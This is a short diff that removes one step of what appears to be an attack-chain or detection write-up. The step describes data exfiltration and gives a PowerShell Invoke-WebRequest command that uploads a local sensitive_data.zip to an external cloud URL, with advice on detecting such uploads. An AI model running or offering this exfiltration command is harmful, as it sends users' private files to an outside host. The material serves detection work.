@@ -1,7 +1,0 @@
-
-   7. **Data Exfiltration**
-      - Application: PowerShell
-      - User Action: The payload initiates a data exfiltration process using a command to upload sensitive files to a cloud service.
-      - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri https://cloudservice.com/upload -Method POST -InFile C:\Users\User\Documents\sensitive_data.zip`
-      - Detection: Monitor for PowerShell commands that upload files to external services, especially those using common cloud service URLs.
-   
